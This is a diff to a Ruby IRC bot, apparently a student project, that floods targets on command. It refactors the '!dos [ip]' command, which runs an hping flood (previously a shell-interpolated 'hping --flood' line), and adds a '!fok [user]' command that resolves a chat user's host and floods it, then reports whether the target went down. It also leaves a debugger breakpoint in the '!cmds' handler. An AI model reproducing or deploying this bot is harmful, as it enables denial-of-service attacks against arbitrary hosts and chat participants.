@@ -5,6 +5,7 @@ require 'cinch'
 require 'uri'
 require 'net/ping'
 require 'pry'
+require_relative 'action'
 # require 'yaml'
 
 VERSION = "0.3"
@@ -39,7 +40,7 @@ def get_ip m
 end
 
 def help m
-  m.reply "!cmds, !help, !version, !dos [ip], !ping, !ping [ip], !code, !intra, !intra [on/off], #{SEARCH_ENGINES_KEYS}"
+  m.reply "!cmds, !help, !version, !dos [ip], !fok [user], !ping, !ping [ip], !trace [ip], !code, !intra, !intra [on/off], #{SEARCH_ENGINES_KEYS}"
 end
 
 bot = Cinch::Bot.new do
@@ -87,6 +88,7 @@ bot = Cinch::Bot.new do
     m.reply Net::Ping::External.new("intra.epitech.eu").ping? ? "Intra ok" : "Intra down"
   end
 
+  INTRA_PING_SLEEP = 30
   on :message, "!intra on" do |m|
     @intra ||= Mutex.new
     if @intra.try_lock
@@ -97,7 +99,7 @@ bot = Cinch::Bot.new do
         loop do
           break if @intra_on == false
           m.reply Net::Ping::External.new("intra.epitech.eu").ping? ? "Intra ok" : "Intra down"
-          sleep 3
+          sleep INTRA_PING_SLEEP
         end
         @intra.unlock
       rescue
@@ -135,9 +137,9 @@ bot = Cinch::Bot.new do
       begin
         ip = get_ip m
         m.reply "Begin attack against #{ip}"
-        s = `timeout #{DOS_DURATION} hping --flood '#{ip}' 2>&1`
+        s = Action.dos(ip, DOS_DURATION)
         s = s.split("\n")[3].to_s
-        m.reply (Net::Ping::External.new(ip).ping? ? "failed :(" : "down !!!") + " " + s
+        m.reply (Action.ping(ip) ? "failed :(" : "down !!!") + " " + s
         sleep DOS_WAIT
         @dos.unlock
       rescue
@@ -146,6 +148,14 @@ bot = Cinch::Bot.new do
     else
       m.reply "Wait for the end of the last dos"
     end
+  end
+
+  on :message, /!fok #{TARGET}\Z/ do |m|
+    nick = get_ip m
+    host = m.target.users.keys.find{|u| u.nick == nick rescue nil}.host rescue nil
+    s = Action.dos(host, DOS_DURATION)
+    s = s.split("\n")[3].to_s
+    m.reply "#{nick} : " + (Action.ping(host) ? "failed :(" : "down !!!") + " " + s
   end
 
   on :message, /!trace #{TARGET}\Z/ do |m|
@@ -173,6 +183,7 @@ bot = Cinch::Bot.new do
 
   on :message, "!cmds" do |m|
     help m
+    binding.pry
   end
 
   on :message, "!help" do |m|
